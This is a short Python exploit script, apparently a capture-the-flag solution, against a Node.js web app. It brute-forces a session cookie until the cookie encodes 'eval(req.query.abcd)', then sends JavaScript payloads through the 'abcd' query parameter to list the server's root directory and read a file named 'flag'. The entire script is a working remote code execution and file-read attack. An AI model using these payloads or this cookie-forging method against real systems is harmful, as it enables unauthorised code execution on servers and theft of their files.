import requests
from urllib.parse import unquote, quote
from pwn import args
URL = args.URL
R = requests.Session()
print(URL)
def brute_cookie(URL):
    global R
    code = '6576616C287265712E71756572792E6162636429'.lower()
    cur = unquote(R.get(URL).cookies['code'])
    R.cookies.set("code", cur)
    print(cur)
    text = cur.split(':')[-1].split('.')[0]   
    for i in range(len(text), 40):
        while True:
            new_cur = unquote(R.get(URL+'/random').cookies['code'])
            text = new_cur.split(':')[-1].split('.')[0]
            if text[-1] == code[i]:
                break
        cur = new_cur
        print(cur)
        R.cookies.set("code", cur)

if args.COOKIE:
    R.cookies.set("code", args.COOKIE)
else:
    brute_cookie(URL)

result = R.get(URL + '/random?abcd=' + quote("require('fs').readdirSync('/').toString('utf8')")).json()
print(result)
cur_dir = result['result'].split('result = ')[-1]

for file in cur_dir.split(','):
    if file.startswith('flag'):
        print(R.get(URL + '/random?abcd=' + quote(f"require('fs').readFileSync('/{file}').toString('utf8')")).json())
        break
